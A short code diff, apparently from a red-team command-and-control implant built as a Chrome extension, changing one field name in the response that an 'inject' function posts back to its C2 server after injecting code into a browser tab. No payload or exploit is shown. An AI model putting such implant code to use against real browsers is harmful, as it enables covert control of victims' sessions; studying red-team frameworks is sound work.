@@ -9,7 +9,7 @@ inject = function(task) {
         if (chrome.runtime.lastError) {
             C2.sendError(taskid, tasktype);
         } else {
-            let response = {"task_id":task.task_id, "user_output":"injected code into tab with id " + tab, "completed": true};
+            let response = {"task_id":task.id, "user_output":"injected code into tab with id " + tab, "completed": true};
             let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
             let enc = JSON.stringify(outer_response);
             let final = apfell.apfellid + enc;
